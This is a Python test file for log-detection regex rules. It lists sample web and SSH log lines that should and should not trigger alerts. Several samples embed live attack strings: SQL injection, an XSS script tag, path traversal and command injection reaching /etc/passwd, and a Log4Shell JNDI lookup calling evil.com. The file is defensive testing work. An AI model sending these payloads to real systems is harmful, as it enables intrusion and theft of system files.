import re
from tier1 import REGEX_RULES

# A curated list of log samples to test our regex rules.
# This list should contain logs that MATCH rules and logs that DON'T.
TEST_LOGS = [
    # --- Logs that SHOULD match ---
    # SQL Injection
    "8.8.8.8 - - [10/Sep/2025:00:00:00 +0000] \"GET /products.php?id=1' OR 1=1 -- HTTP/1.1\" 404 123",
    # XSS
    "8.8.8.8 - - [10/Sep/2025:00:00:01 +0000] \"GET /search?q=<script>alert(1)</script> HTTP/1.1\" 200 456",
    # Directory Traversal
    "8.8.8.8 - - [10/Sep/2025:00:00:02 +0000] \"GET /etc/passwd%2e%2e%2f..%2f..%2f HTTP/1.1\" 404 123",
    # Web Scanner
    "8.8.8.8 - - [10/Sep/2025:00:00:03 +0000] \"GET / HTTP/1.1\" 200 789 \"-\" \"Nmap Scripting Engine\"",
    # SSH Brute-Force
    "Sep 12 23:30:15 server sshd[1234]: Failed password for invalid user admin from 1.2.3.4 port 54321 ssh2",
    "Sep 12 23:30:18 server sshd[1235]: Failed password for root from 1.2.3.4 port 54322 ssh2",
    # Accepted Login
    "Sep 12 23:31:00 server sshd[1236]: Accepted publickey for john from 192.168.1.100 port 12345 ssh2",
    # Log4Shell
    "8.8.8.8 - - [10/Sep/2025:00:00:04 +0000] \"GET / HTTP/1.1\" 200 123 \"-\" \"${jndi:ldap://evil.com/a}\"",
    # Command Injection
    "8.8.8.8 - - [10/Sep/2025:00:00:05 +0000] \"GET /exec?cmd=cat%20/etc/passwd;whoami HTTP/1.1\" 500 123",
    
    # --- Logs that should NOT match (False Positive Check) ---
    "8.8.8.8 - - [10/Sep/2025:00:01:00 +0000] \"GET /index.html HTTP/1.1\" 200 1234",
    "Sep 12 23:32:00 server systemd[1]: Starting daily apt upgrade job...",
    "User updated their profile with the description: 'I love to script amazing websites!'",
    "The report shows a union of two datasets for our quarterly review.",
]

def test_tier1_rules():
    """
    Runs the Tier 1 regex rules against a list of test logs and prints the results.
    """
    print("--- Starting Tier 1 Rule Test ---")
    
    for i, log_message in enumerate(TEST_LOGS):
        match_found = False
        print(f"\n[TESTING LOG {i+1}]: {log_message}")
        
        for rule_name, pattern in REGEX_RULES.items():
            # In a real system, you might search across multiple fields (e.g., message, user_agent)
            # For this test, we'll just search the raw log message.
            if re.search(pattern, log_message, re.IGNORECASE):
                print(f"  ✅ MATCH FOUND! Rule: '{rule_name}'")
                match_found = True
                break # Stop after the first match
                
        if not match_found:
            print("  ❌ No match found.")
            
    print("\n--- Test Complete ---")

if __name__ == "__main__":
    test_tier1_rules()
